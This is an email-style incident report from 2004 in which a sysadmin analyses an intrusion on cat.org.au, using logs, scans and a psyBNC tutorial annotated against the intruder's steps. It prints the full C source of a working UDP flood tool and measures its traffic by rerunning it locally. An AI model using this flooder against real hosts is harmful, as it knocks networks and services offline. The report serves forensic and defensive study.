@@ -1,0 +1,1282 @@
+From predator@cat.org.au Thu Mar  4 17:44:39 2004
+Date: Wed, 3 Mar 2004 03:18:49 +1100 (EST)
+From: predator@cat.org.au
+To: g.gordon@unsw.edu.au
+Subject: What was the cracker doing?
+
+
+Hi Geoff. Good to chat to you today. 
+
+There is no evidence from my bash_history that there was anything really
+deliberately malicious that the chap was doing to cat.org.au. To my
+awareness he never did anything which was designed to hide log entries
+(hence we have a lot of them) or modify/delete files, add backdoors to
+daemons, install a rootkit, grab the password file, etc. There was some
+anomalous behaviour on conway (mainly lockouts and crashes, it had been up
+for at least a month prior to that) correlating with the unauthorised
+activity and possibly some lossage of stuff on /usr but that was all
+backed up on an unmounted spun-down harddisk. Still... this inconvenienced
+me and several other people.
+
+
+----------
+Auth.logs
+
+Here's some analysis of the auth.log on conway, for the day that I locked
+your cracker out of the machine here at Turella, conway.cat.org.au. He
+did, it appears, try and log in again several times after I changed the
+password.
+
+The auth.logs don't care about tty entries, since they're not invoked from
+the network, and are assumed to be authorised at a physical level (if you
+can get to a keyboard, you probably own the machine anyway.)
+
+These are the auth.log entries for the day I logged him out, with
+commentaries:
+
+root@conway:~# grep 129.94 /home/predator/auth.log | grep 129.94
+
+
+
+>Feb 26 00:26:39 conway sshd[27174]: Could not reverse map address
+>129.94.222.175.
+>Feb 26 00:26:41 conway sshd[27174]: Accepted password for predator from
+>129.94.222.175 port 2101
+
+That's the unauthorised chap logging in 15 minutes before I arrived
+locally at the server. I arrived about fifteen minutes later, at twenty
+minutes to one in the morning, initially logged in from tty4.
+
+It happens that when I'm in the same room, I normally log in to conway,
+from an adjacent machine, tarvat.cat.org.au (192.186.2.1) which is our
+NAT/firewall/router box. That I logged into conway at conway's terminal at
+all, was a consequence of conway's process allocation being so completely
+monopolised by the hajar executable, and the network bandwidth between
+conway and tarvat (10mbit/sec) being so saturated that ssh authentication
+was taking forever to complete, so I changed chairs, powered up conway's
+monitor and logged in there directly. I ran top -qi, and shortly after
+that point I kill -9'd ed the hajar executable (bringing loadavg back to
+something respectable - most of the utilisation LEDs on the DE-1600 hub
+then went dark - all of them were lit solid when I arrived).
+
+Then I ran w, looked at the originating IPs and then killed all of the
+bash shells from 129.94.222.175, which presumably killed the psyBNC mIRC
+proxy if it was running at all (maybe it never was invoked). 
+
+
+
+I then logged in from several other virtual terminals on conway and tried
+and figure out where the heck this 129.94 machine was, hence this entry
+below. My account (predator) is superuser capable and any superuser
+privelages used via sudo are logged, such as the following entry from me
+on the morning:
+
+
+>Feb 26 00:41:25 conway sudo: predator : TTY=tty4 ; PWD=/home/predator ;
+>USER=root ; COMMAND=/usr/sbin/traceroute 129.94.222.175
+
+
+Here below, in this entry, he tries to log in again.  PuTTY.exe likes to
+try to reverse-lookup DNS entries first so the client can be
+name-identified before permitting access, but I think this doesn't happen
+because these UNSW numbers don't have assocated DNS entries anyplace.
+
+>Feb 26 02:34:15 conway sshd[3712]: 
+>Could not reverse map address 129.94.222.175.
+>Feb 26 02:34:20 conway sshd[3712]: Failed password for predator from
+>129.94.222.175 port 2163
+
+
+He tries again about a minute later....
+
+>Feb 26 02:35:38 conway sshd[3712]: Failed password for predator from
+>129.94.222.175 port 2163
+
+Then again nine seconds later....
+
+>Feb 26 02:35:45 conway sshd[3712]: Failed password for predator from
+>129.94.222.175 port 2163
+
+
+I think at this point he's decided the PuTTY session is broken (and maybe
+his IRC proxy is not working anymore either) so he invokes PuTTY again,
+and the reverse DNS entry request fails again:
+
+>Feb 26 02:36:18 conway sshd[3798]: Could not reverse map address
+>129.94.222.175.
+>Feb 26 02:36:26 conway sshd[3798]: Failed password for predator from
+>129.94.222.175 port 2172
+
+... and he tries again, with a new session, nearly three minutes later....
+
+>Feb 26 02:39:28 conway sshd[3901]: Could not reverse map address
+>129.94.222.175.
+>Feb 26 02:39:35 conway sshd[3901]: Failed password for predator from
+>129.94.222.175 port 2188
+
+... and again 4 seconds later in the same session.
+
+>Feb 26 02:39:39 conway sshd[3901]: Failed password for predator from
+>129.94.222.175 port 2188
+
+
+I think he finally gets the idea that he's locked out after six attempts.
+
+There are no other entries from that machine.
+
+By 3:25am the email you got on Thurs 26th Feb was on its way to Graham
+Low. It was also posted to catgeek, a mailman list where the admin on
+cat.org.au post tech discussions to each other. One of the other root
+admin here, Andy, read the posting not long after, and did what I did -
+portscanned the machine in question:
+
+
+>Feb 26 03:47:43 conway sudo:  andy : TTY=pts/2 ; PWD=/spare/backups ;
+>USER=root ; COMMAND=/usr/bin/nmap -sS 129.94.222.175
+
+
+That's everything of relevance to 129.94.222.175 from Feb 26's
+auth.logs.
+
+Earlier auth.logs contain the following:
+
+Feb 16 13:38:47 conway sshd[9054]: Accepted password for predator from 129.94.222.105 port 4920
+Feb 16 13:54:50 conway sshd[10156]: Accepted password for predator from 129.94.222.105 port 4986
+Feb 16 14:22:54 conway sshd[12410]: Accepted password for predator from 129.94.222.105 port 1090
+Feb 16 14:26:05 conway sshd[12679]: Accepted password for predator from 129.94.222.105 port 1131 ssh2
+Feb 16 14:30:19 conway sshd[13087]: Accepted password for predator from 129.94.222.105 port 1132 ssh2
+
+(the fun probably starts below here...)
+Feb 18 13:15:45 conway sshd[18185]: Accepted password for predator from 129.94.222.177 port 2018
+Feb 19 18:56:47 conway sshd[11154]: Accepted password for predator from 129.94.222.175 port 4873
+Feb 20 16:10:20 conway sshd[13291]: Accepted password for predator from 129.94.222.175 port 2362
+Feb 20 16:41:04 conway sshd[19611]: Accepted password for predator from 129.94.222.175 port 2551
+Feb 21 13:29:33 conway sshd[10488]: Accepted password for predator from 129.94.222.175 port 2912
+
+Then .... did nothing until the 26th as far as I can tell.
+
+------------------------
+conway syslogs
+
+I was wondering if some invokations of pine in my bash_history entries
+that day were invoked by him looking at emails he'd managed to send to
+himself (well, to me) but this appears to not be the case.
+
+The syslogs for the 23rd to the 26th (chop-off day) have four entries
+pertinent to 129.94 addresses:
+
+Feb 26 06:43:56 conway qmail: 1077738236.012945 
+tcpserver: pid 6978 from 129.94.12.209
+Feb 26 06:44:25 conway qmail: 1077738265.105903 
+tcpserver: pid 7007 from 129.94.12.209
+
+These above correlate with the two messages from Graham Low to you (Geoff)
+and I, which left UNSW timestamped at 06:41:53 AM and 06:42:23 am.
+
+Feb 23 17:06:27 conway qmail: 1077516387.618695 
+tcpserver: pid 6274 from 129.94.12.209
+Feb 23 19:16:18 conway qmail: 1077524178.101642 
+tcpserver: pid 14297 from 129.94.12.209
+
+These two also check out to emails I recieved from Graham which left UNSW
+timestamped at 17:04:36 and 19:14:18 on their respective days. Graham must
+be working long days!
+
+Again, the timestamps are accurate. These are out-of-normal-hours SMTP
+connections from notesmta.commerce.unsw.edu.au, and noteworthy because of
+their odd times, but otherwise check out. 
+
+Other entries in earlier parts of the syslog correlate to other legitimate
+postings I recieved from Graham Low, Shane Stevens' cse account, late
+submissions from GENC5001 students Peter Koh and Kim Warner, and also a
+posting from Joe Wolfe in the UNSW physics department. So I suspect if
+your cracker has an 0wn3d email account anyplace in UNSW which he wanted
+to test, he didn't test it by sending things to predator@cat.org.au then
+deleting them.
+
+------------------------
+conway snort logs.
+
+The snort logs for conway.cat.org.au indicate nothing from 129.94.222.175
+for all of February. As far as snort is concerned, the chap had a legit
+passwd/account combo (mine) so was legitimately logging in.
+
+-----------------------
+Conway /var/log/messages
+
+is, with respect to 129.94 numbers, completely mundane but has a UNSW
+machine on an IP number I don't associate with UNSW. 
+
+zgrep unsw messages.1.gz 
+
+gets me this :
+
+life-x.life.unsw.edu.au  149.171.170.4
+
+Appears to be an alias to smtp3.unsw.edu.au 
+
+ 1  tarvat (192.168.2.1)  0.447 ms  0.420 ms  0.321 ms
+ 2  tel140302-2.gw.connect.com.au (210.9.224.241)  557.850 ms  534.234 ms  400.477 ms
+ 3  bdr1.telenet.net.au (202.9.33.65)  329.817 ms  141.028 ms  62.680 ms
+ 4  gigabitethernet0-3-15.cor2.bri.connect.com.au (203.63.117.246)  60.696 ms  65.115 ms  108.969 ms
+ 5  gigabitethernet4-0-0.bdr1.bri.connect.com.au (203.63.11.81)  133.138 ms  105.336 ms  108.336 ms
+ 6  so-1-0-1.cre1.for.connect.com.au (202.10.4.45)  187.867 ms  65.373 ms  137.621 ms
+ 7  so-0-1-0.cre1.bri.connect.com.au (202.10.0.56)  44.293 ms  56.025 ms  39.347 ms
+ 8  so-2-1-1.cre1.syd.connect.com.au (202.10.0.33)  57.829 ms  59.814 ms  61.287 ms
+ 9  pos1-0.bdr4.syd.connect.com.au (202.10.4.62)  57.830 ms  60.106 ms  60.509 ms
+10  vlan219.52gdc76f02.optus.net.au (61.88.171.205)  58.332 ms  61.796 ms  55.901 ms
+11  gigeth3-0.ug1.optus.net.au (203.202.36.1)  61.948 ms  58.625 ms  60.303 ms
+12  gigeth1-0-0.sn2.optus.net.au (202.139.190.16)  59.773 ms  60.889 ms  56.782 ms
+13  * nsw-rno-dom.sn2.optus.net.au (202.139.18.114)  58.108 ms  53.548 ms
+14  203.15.123.177 (203.15.123.177)  54.050 ms  59.274 ms  52.545 ms
+15  gigxxx.unsw.edu.au (138.44.1.38)  56.228 ms  117.588 ms  54.973 ms
+16  129.94.255.182 (129.94.255.182)  53.398 ms  66.237 ms  53.127 ms
+17  life-x.life.unsw.edu.au (149.171.170.4)  54.120 ms  55.444 ms  59.328 ms
+
+(many) ports open on this machine are:
+21, 25, 80, 110, 119, 135 (filtered) 139 (filtered), 143, 161
+(filtered) 162 (filtered) 443, 445 (filtered) 563, 593 (filtered), 691,
+993, 995, 1379, 3389, 4444 (filtered), 6001, 6002, 6004, 8081, and 10000
+
+I don't know if this is of relevance.
+
+
+
+-----------------------
+The port 51 exploit:
+
+The C code which was compiled on conway and launched without authorization
+as an executable from my account is attached below. Output appeared to be
+sent to stderr (not a file). Targetted machines were:
+
+>   196  ./hajar 80.144.184.19 51&
+This appears to be a machine somewhere in Europe, on t-dialin.net, via
+sprintlink in Germany. It thinks it is called p5090b813.dip.t-dialin.net.
+That port is currently filtered, the service is la-maint
+
+>   255  ./hajar 202.159.50.17 51&
+This is a machine in Indonesia, probably several hops into indo.net.id; 
+It thinks it is called mma-ip-017.indo.net.id
+Port 51 on that machine is currently closed.
+ 
+
+>   319  ./hajar 202.155.38.120 51&
+This looks to be an indosat.net machine reachable via INTER.NET's
+Indonesian satellite gateway. Port 51 on that machine is currently closed.
+
+
+>   364  ./hajar 203.173.147.137 51&
+This is a machine under the administration of ihug, Sydney.
+It thinks it is called p137-tnt8.syd.ihug.com.au
+It is also running la-maint in filtered mode, and is blocking ping probes.
+
+la-maint is apparently a logical address maintainer for IMP. I am not sure
+what the significance of this is, now how he chose his numbers.
+
+
+------------------
+Benchmarking the local load effects of running the attack:
+
+
+The code itself is:
+
+> #include <stdio.h>
+> #include <sys/param.h>
+> #include <sys/socket.h>
+> #include <netinet/in.h>
+> #include <netdb.h>
+> #include <stdarg.h>
+> #define JENIS_PELURU "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+> #define UKURAN_PELURU 45
+> 
+> int echo_connect(char *, short);
+> int echo_connect(char *server, short port)
+> {
+> struct sockaddr_in sin;
+> struct hostent *hp;
+> int thesock;
+> printf("\n");
+> printf("Pasukan..!!!! Tembaaaak %s ke port %d\n",
+> server, port);
+> hp = gethostbyname(server);
+> if (hp==NULL) {
+> printf("Di %s gak ada sasaran, Boss!!\n",server);
+> printf("\n");
+> exit(0);
+> }
+> bzero((char*) &sin, sizeof(sin));
+> bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
+> sin.sin_family = hp->h_addrtype;
+> sin.sin_port = htons(port);
+> sin.sin_family = hp->h_addrtype;
+> sin.sin_port = htons(port);
+> thesock = socket(AF_INET, SOCK_DGRAM, 0);
+> connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
+> return thesock;
+> }
+> 
+> 
+> main(int argc, char **argv)
+> {
+> int s;
+> if(argc != 3)
+> {
+> printf("\n");
+> printf("Kirim Paket ke IP orang\n\n");
+> printf("Cara Pake : $ tembak hostname.orang port \n\n");
+> exit(0);
+> }
+> s=echo_connect(argv[1], atoi(argv[2]));
+> for(;;)
+> {
+> send(s, JENIS_PELURU, UKURAN_PELURU, 0);
+> }
+> }
+
+
+I just now un-froze this as he compiled it, and ran it thus:
+
+predator@conway:~/   $hajar 192.168.2.3 51
+
+It says:
+
+Pasukan..!!!! Tembaaaak 192.168.2.3 ke port 51
+
+
+If invoked with & at the end it will run in background. While hajar _is_
+running in background,
+
+predator@conway~:sudo lsof | grep hajar 
+
+gets this:
+
+hajar     27794 predator  cwd    DIR       3,66     4096     327141 /home/predator/   
+hajar     27794 predator  rtd    DIR        3,1     4096          2 /
+hajar     27794 predator  txt    REG       3,66     6762     327143 /home/predator/   /hajar
+hajar     27794 predator  mem    REG        3,1    92174     163078 /lib/ld-2.3.2.so
+hajar     27794 predator  mem    REG        3,1  1230864     166374 /lib/libc-2.3.2.so
+hajar     27794 predator    0u   CHR      136,3                   5 /dev/pts/3
+hajar     27794 predator    1u   CHR      136,3                   5 /dev/pts/3
+hajar     27794 predator    2u   CHR      136,3                   5 /dev/pts/3
+hajar     27794 predator    3u  IPv4    7826995                 UDP conway.cat.org.au:42043->conway.cat.org.au:51 
+grep      27985 predator    1w   REG       3,66        0     507774 /home/predator/hajar.lsof.txt
+
+
+The second last line is interesting and correlates with the output of
+trafshow (not shown here) while hajar runs in the background. It sends a
+LOT of UDP traffic at port 51 of the target machine from ports in the
+420xx range. It eats about 94% of the available CPU effort while it runs
+in order to do this.
+
+Here's the ifconfig stats - check the loop interface (the attack is
+launched over the loop interface during this investigation
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:23776994 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:23776994 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:2655499384 (2.4 GiB)  TX bytes:2655499384 (2.4 GiB)
+
+Let's check them again exactly one minute later
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:26533212 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:26533212 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:2895290404 (2.6 GiB)  TX bytes:2895290404 (2.6 GiB)
+
+
+
+So... conway's 94% busy running this script, and in 60 seconds has
+generated approx 640 megabytes of UDP packets containing whatever this
+script is attempting to do.
+
+Invoking it at our firewall just now:
+
+./hajar 192.168.2.1 51&
+
+reproduces the `All hub utilisation lights on' phenomenon which brought
+all this to my attention in the first place.
+
+
+No wonder conway wasn't paying attention to my attempts to log in!
+
+The other thing which he presumably intended to run was the psyBNC IRC
+proxy - probably in line with proxies he runs on Windows machines on
+campus.
+
+
+Here's the blurb, via Google.
+------------------
+------------------
+My comments in here like so.
+------------------
+------------------
+
+
+An Introduction to psyBNC 2.3.1
+�2002,2003 jestrix - jestrix(at)jestrix(dot)net
+
+Updated for version 2.3.1 on 8 Oct 02
+XHMTL 1.1 Formatting and various revisions - 9 Mar 03
+Last Revision: 5 December 2003 - Corrected "S=" error. (found by J.H.)
+
+Please see the LICENSE section for usage of this document
+
+   Contents:
+     * Introduction
+     * Basic Stuff
+          + Configuring and compiling
+          + Setting up your account
+          + Other commands I find useful
+     * Harder Stuff
+          + User management
+          + DCC Stuff
+          + Multiple networks
+          + Linking
+     * Appendix
+          + Dissecting psybnc.conf
+          + Setting crontab
+          + SSL enabled clients
+          + LICENSE
+
+
+   Introduction
+
+   If you know nothing about bncs, a bnc is short for a 'bouncer.' A bnc
+   acts as a proxy for irc, allowing you to hide your real IP address and
+   use a vhost (vanity host - something like 'this.is.a.l33t.vhost.com').
+   What are the advantages of this? Well, mainly there's just one
+   important one: It'll stop stupid packet kiddies from trying to knock
+   you off the network. Everyone hates getting disconnected, and with a
+   bnc on a decent shell, you should be pretty immune. Remember though:
+   the kiddies can still nuke you, but it is assumed that the shell
+   provider has a high-bandwidth line that allows it to withstand the
+   numerous packets. If your shell is on a 56.6, you'll still be screwed.
+
+----------
+----------
+We're on a 512Mbit/sec incoming DSL link. So if someone was trying to
+knock this chap off we'd be fielding a lot of incoming packets!
+----------
+----------
+
+
+   So... why psybnc? There are a variety of other open source bnc's
+   available for you to download, most notably EZBounce and plain-ol BNC.
+   Both of these do the exact same basic thing as psybnc: hide your real
+   host. But that's about where the similarity ends. I've been using psy
+   for a long time now, and I love with all the features that it offers.
+   To name a few:
+   � You'll always be connected to irc. Even when you close your irc
+   client, psy will maintain your connection. When you connect later,
+   you'll instantly be back on the channels you left. This also lets you
+   hold your nick (if you need that feature), or hold ops on a channel.
+   � psy hides your IP even in DCC sessions. In other bncs, a direct
+   client-client session is opened, thus revealing your IP. In psy, the
+   connection is bounced through the shell, and your IP remains your
+   dirty little secret ;)
+
+----------
+----------
+Well, not if it's someone elses ;-)
+----------
+----------
+
+
+   � You can link multiple psy's together. This allows you to share
+   vhosts, and also create a small ircd, termed the 'internal' network on
+   the bncs.
+   � psyBNC now supports SSL. woohoo :)))
+
+   There are tons more features, but you can just download the source and
+   view the README.
+
+   Now... for the first part of this tutorial, the Basic section, I
+   assume you have little or no experience with shells/irc. For the
+   Intermediate section, though, I assume you can hold your own. For most
+   users, the Basic is as far as they need to go, but all the fun stuff
+   is a bit more complicated.
+
+
+   Configuring and Compiling
+
+   Hopefully you have already downloaded the source. If not, you can find
+   it here: http://www.psychoid.lam3rz.de. After you have downloaded
+
+----------
+----------
+Yes, actually that's exactly where he downloaded it from. Maybe he read
+this same tutorial?
+----------
+----------
+
+
+   that, fire up your favorite ftp client and upload it to the root
+   directory of your shell. You could also get the source by using lynx
+   or wget. Example wget command:
+   wget http://www.psychoid.lam3rz.de/psyBNC2.3.1.tar.gz
+
+----------
+----------
+This is *precisely* the command he used.
+----------
+----------
+
+   The next step is to decompress this file (.tar.gz is kinda like a .zip
+   file for all you windoze ppl out there). To do this, type:
+   tar zxvf psyBNC2.3.1.tar.gz
+
+   Notice that it's case-sensitive. Everything in unix is case-sensitive.
+   Keep that in mind for everything in the future.
+
+   If you typed the correctly, you should have a psybnc directory on your
+   shell. Change to it and see what you have!
+   cd psybnc
+   ls -al
+
+----------
+----------
+He did that too, same version and all!
+----------
+----------
+
+
+   Now, this next part is where it gets a bit harder. psyBNC includes a
+   GUI for configuring the bnc. However, this requires ncurses to be
+   installed on your shell, something a bunch of shells do not have. In
+   my experience, most flavors of linux have it installed, but some
+   others don't. So, give it a whirl. Type:
+   make menuconfig
+
+----------
+----------
+We have ncurses but make menuconfig was the next thing he did.
+----------
+----------
+
+
+
+   If you get a GUI, congrats: the configuring process is much easier. If
+   not, well, welcome to my world ;) With menuconfig, the GUI is very
+   easy to follow: obviously an [X] denotes that the option is selected,
+   while [ ] indicates it's not.
+
+   For all those stuck doing it by hand, after each option I explain how
+   to set it. For all the compiling options, everything is placed in the
+   file config.h, which is found in the psybnc directory. Just open that
+   file with your favorite editor on the shell (I use and recommend pico
+   - You can edit the file by typing:
+   pico config.h
+
+----------
+----------
+I think this never happened - so he did a standard psyBNC config.
+Or maybe he gave up - it was all too hard.
+----------
+----------
+
+
+
+   Compiling options
+   Support Encryption #define CRYPT
+
+
+   This encrypts all your passwords, and enables support for channel
+   encryption, relay encryption, etc... I highly recommend you leave this
+   enabled.
+   Encryption Type #define BLOWFISH or #define IDEA
+
+
+   (default = Blowfish) Cryptographically speaking, these ciphers are
+   about equally secure. However, Blowfish is much faster. You can read
+   more about Blowfish here Also, IDEA is patent-protected - you should
+   get permission before using it!
+   Support Translation #define TRANSLATE
+
+
+   This lets you type in english (or whatever your language is) and have
+   the text in the channel appear in a different language. You'll have to
+   see the README for more information: I don't use this feature.
+   Support Internal Network #define INTNET
+
+
+   This lets you use the internal ircd that psy has. Think of it as a big
+   partyline where you can set modes/bans/topic/etc... I like it, and I
+   recommend you leave it enabled.
+   Support Traffic Logging #define TRAFFICLOG
+
+
+   This enables support for logging channels when you're not around. It
+   can be handy, but it can also eat up your shell disk space VERY fast.
+   So be careful if you enable this. (note: you can leave support for it
+   enabled here, then disable it after it is compiled by simply turning
+   it off)
+   Support Linkage #define LINKAGE
+
+
+   If you want your bnc to link to others (or others to link to yours),
+   enable this. I use it.
+   Support DCC Files / DCC Chat #define DCCFILES and #define DCCCHAT
+
+
+   Standard DCC features over IRC. Most people use these features, so
+   leave em be.
+   User Mode #define MULTIUSER or #define SINGLEUSER
+
+
+   Multiuser or Singleuser. If you're going to share your bnc, set it to
+   multi. If it's just you, set it to Single.
+   Maxium users #define MAXUSER n
+
+
+   Pretty self-explanatory. However note that each network you add (if
+   you use multiple networks) adds a virtual user. Be sure to keep this
+   in mind when setting a max! (And really a max is pointless unless you
+   are running an anonymous bnc) (n = # of users)
+   Maximum connections #define MAXCONN n
+
+
+   This is the number that each user can have. They need at least 2
+   (incoming/outgoing) and more for dcc's, multiple networks, etc. I
+   suggest leaving it at 25. (n = # of connections per user)
+   Support Scripting #define SCRIPTING
+
+
+   psyBNC allows user-specific scripts. I will not discuss that in this
+   tutorial, but it doesn't hurt to leave support for it enabled.
+   Support oIdentd #define OIDENTD
+
+
+   If your shell supports it, this allows users to define their own
+   ident. Most don't support it. I don't use it. (for more info on
+   oIdentd: http://ojnk.sourceforge.net/)
+   Use asynchroneous resolving #define ???? definition unknown
+
+
+   EXPERIMENTAL!!Tells psy to use asynchronous (as opposed to
+   synchronous) DNS lookups. This is not a tutorial on DNS so I will not
+   get into it. Note this works only if your system supports it!
+   Support Multiple IRC Networks #define NETWORK
+
+
+   This allows users to connect to >1 network with the same client.
+   Hence, in one mirc session, the user could be on efnet, dalnet and
+   ircnet. I love this feature and recommend you leave it enabled (even
+   if you don't plan to use it now).
+   Support proxy usage #define PROXYS
+
+
+   If you want to further anonymize your connection by bouncing
+   mirc-->bnc-->proxy-->irc, enable this. But since most irc servers
+   check for open proxies, this won't work in many cases.
+   Anonymous Bouncer Usage #define ANONYMOUS
+
+
+   Want the whole world to use your bnc? Then enable this! (not
+   recommended)
+   No Permanent IRC-Connections #define DYNAMIC
+
+
+   If this is enabled, psy will disconnect you from irc when you
+   disconnect rom the bnc. Otheriwse, you'll always stay connected to irc
+   unless you force it to quit.
+   Loglevel #define LOGLEVEL n
+
+
+   3 different options here, choose your poison. I prefer to leave them
+   all enabled since I like to know everything going on with my bnc.
+   (define where n is: 0 = Errors, Warnings and Info; 1 = Errors and
+   Warnings; 2 = Errors only)
+   Use the 2.1.1 compatible partyline #define PARTYCHANNEL
+
+
+   If you're going to be linking to old psy's, this might be good to
+   enable. But if you're the only bnc, or if they're all > 2.2, no need
+   to enable this option.
+   Version reply #define CTCPVERSION "reply"
+
+
+   Set the reply psybnc will send when someone sends you a CTCP VERSION
+   query. (note: when you are connected to the bnc, psy will be
+   transparent, all ctcp's will be answered by mirc. When you're not
+   connected, psy will only answer to the version ctcp as set by this
+   option.) (psy defaults to: "psyBNC 2.3.1 by the most psychoid")
+   SSL-Path #define SSLPATH "/path/to/ssl"
+
+
+   (default: wherever your openssl installation has been detected) - If
+   you wish the use SSL on your bnc, the default here should be fine.
+   However, if you have multiple openssl installations for some reason,
+   then define the path to the one you want to use. If you do not want
+   SSL compiled into psyBNC, then specify something like /dev/null here.
+   Note that you can compile SSL support into your bnc and simply not use
+   it.
+   SSL-SecLevel #define SSLSEC n
+
+
+   (default: Check Certs and Keys (NOT IMPLEMENTED)) - Sets the security
+   level of your SSL setup. This can be one of the following: None, Check
+   Certs, or the default. These different options correspond to values 0,
+   1 and 2 respectively for use in config.h. As with async DNS, this is
+   not an SSL tutorial. Note however that setting 'None' does NOT disable
+   SSL; it simply does not check client certificates. If you're using SSL
+   for encryption only, then you can safely set this option to None.
+   Furthermore, psyBNC has not yet implemented client-checking functions.
+
+
+   Once you have all these options set, you have two choices: If you're
+   using menuconfig, skip to the next step. If you're doing it manually,
+   this is where you actually want to compile your bnc. It's very easy to
+   do. In the psybnc directory, simply type:
+   make
+
+   It won't take long to compile. If you have compiled with SSL enabled,
+   you'll have to create a self-signed certificate at the end of the
+   compilation process. Simply follow the prompts that you are given. The
+   most common error is to specify a wrong Common Name. According to
+   certificate standards, the common name must be a FQHN: Fully Qualified
+   HostName, i.e: psybnc.mydomain.com. Since the certifcate is simply
+   being used a an encryption seed and not as a validation of identity,
+   this is not really important - the cert is not being signed a real CA
+   anyway!
+
+   Configuring options
+
+   If you're using the GUI, all these options are accessable under the
+   Bouncer-Config part of the menu. If you're not using the GUI, all
+   these options are in psybnc.conf, which is created in the psybnc
+   directory after it is compiled. To edit these options manually, just
+   edit this file. The Appendix has the proper syntax for each option.
+   The rest of this section will cover the GUI method.
+
+   Before going through these options, do the following: know the IP of
+   your shell. for example, if you connect to l33t.shell.com open up a
+   console (or command prompt in Win) and ping the hostname. You should
+   see something like this:
+   -bash-2.05b$ ping www.efnet.org
+   PING www.efnet.org (193.45.36.242): 56 data bytes
+   64 bytes from 193.45.36.242: icmp_seq=0 ttl=49 time=132.975 ms
+
+   So if your shell was www.efnet.org (which I can guarantee it is not!),
+   the corresponding IP would be 193.45.36.242.
+
+   Also, choose a port for the bnc. Check the Terms of Use of your shell
+   - some companies require you to use a certain port range. And if
+   you're on a *nix shell, the port will have to be higher than 1024
+   (unless you run the bnc as root, which is certainly not recommended!).
+   Ok, on to the options, same basic format as the compiling options.
+   Listening ports
+
+
+   You have to tell the bnc where to listen. You can have it listen on
+   more than one port on the same IP, on multiple IPs with the same port,
+   etc. For most people, listening on just one port on one IP is
+   adequate. (the psy default is 31337, and you can leave it at that with
+   no problems, but it is always a good security practice to change the
+   port). If you wish to create an SSL listening port, precede the
+   HOSTentry with "S=" i.e.: PSYBNC.SYSTEM.HOST1=S=123.123.123.123
+   This will make the specified port(s) on 123.123.123.123 an SSL port.
+   PSYBNC.SYSTEM.PORT1=xxxxx should never have an "S=" in it.
+   Links
+
+
+   Don't worry about this now.
+   Bouncer Name
+
+
+   Name your bnc. Something like mypsy1 will work just fine.
+   Host Allows
+
+
+   Want to restrict access to certain IPs or certian IP masks? This is
+   the place to put those permissions. psy will disallow access to anyone
+   not listed here. To allow anyone (provided they have the correct
+   username and password) set this to *.
+   Users
+
+
+   At this point, you want to just add yourself. Adding other users will
+   be discussed in more detail later. In menuconfig, just select this,
+   select New then follow the directions. Remember that to connect to
+   psybnc, your ident in mirc must be set to your psybnc username. For
+   all those manual people, jump down to the Appendix, which is where you
+   should be anyway.
+   DCC Host
+
+
+   The IP to use for all your DCC sessions (if you defined DCC support).
+   I recommend setting it to the same IP that your bnc is listening on
+   for simplicity.
+
+
+   Congrats, your setup is complete. If you haven't done so already, it's
+   time to compile your bnc by typing "make" at the shell prompt in your
+   psybnc directory. Then type "./psybnc" to start the bouncer. Hopefully
+   everything went smoothly and you're ready to jump into the next
+   section.
+
+
+
+   Setting up your Account
+
+   The first thing you need to do is connect to your bnc. In your irc
+   client, open up the connect dialogue box and add in another server.
+   Name it My BNC or something like that, enter the IP and port, and
+   enter the password that you chose (either through menuconfig or in the
+   conf file). Now make sure that your ident is set to your username.
+   It's also a good idea to set your e-mail address to
+   username@whatever.com. If psy can't get an ident response from you, it
+   checks your e-mail addy as verification of the username. If everything
+   goes well, you'll see this when you connect:
+   -Welcome- psyBNC2.3.1
+
+   Now you need to get connected to irc: first, you need to select your
+   vhost. To see what vhosts are available, at your shell prompt type:
+   vhosts
+
+   This command is only available if your shell provider has created such
+   a function, but in my experience 99% have. For security reasons (?),
+   there is no way to view the vhosts in psy. After your vhost is
+   selected, you'll need to add in some irc servers, and set a few other
+   options. the commands follow below. All commands appear like this
+   /mycommand, everything else after it is an explanation. All brackets
+   are for my purposes, don't use brackets in any command!
+   /bvhost [vhost] -- (this command used to be /vhost) -- [vhost] is your
+   vhost in alpha form (ie, this.is.a.cool.vhost.com and not 127.0.0.1)
+   /addserver [server] :[port] -- server can be in alpha or numeric
+   form...
+
+   Once you add in the server, psy will auto-connect to it in a short
+   while. You can add in more servers so that if one goes down, psy can
+   reconnect to a different one. Just use the command above again. For
+   server managment:
+   /listservers -- lists all the servers you have added
+   /delserver [n] -- deletes the server with #[n] (as shown by the
+   listservers command)
+   /jump -- disconnects you from your current server and attempts to
+   connect to the next server in your list
+   /bquit -- disconnects you from the server until you force it to
+   connect
+   /bconnect -- connects you to irc
+
+   Now, remember that psy will keep you connected to irc even when you're
+   not connected to the bnc. So, these commands are helpful:
+   /setaway [message] -- psy will display this message to all channels
+   you're on when you quit the bnc. It will NOT repeat this message
+   (since that's gay). To remove the message, just type /setaway
+   /setawaynick [nick] -- when you quit the bnc, psy will auto-change
+   your nick to the nick you set here. When you reconnect, it'll auto
+   change it back to what's shown in the mirc nick.
+
+     OK, now for some more commands that ppl find useful. Remember that
+   ALL commands are in the README file that came with psybnc. I'm not
+   going to repeat all of them.
+   /playprivatelog -- plays the log of all messages sent to you when you
+   were disconnected from the bnc. The log will be opened in a window
+   called -psyBNC.
+   /eraseprivatelog -- erases the aforementioned log.
+
+   psy has a damn cool feature in that it allows encryption. You can
+   encrypt text sent to a channel or a person. Each person needs to have
+   the same key to view the text. This is helpful if you're paranoid, or
+   if you want to have a private conversation in a public channel. (Why
+   you wouldn't just pm is beyond me ;) It also makes you look l33t lol.
+   /encrypt [password] :[channel/person] -- make sure everyone you want
+   to speak with has the same key. And they need to be using psybnc as
+   well. duh.
+   /listencrypt -- lists your current encryptions
+   /delencrypt [n] -- deletes encryption #[n] as shown by the
+   listencryption command.
+
+
+
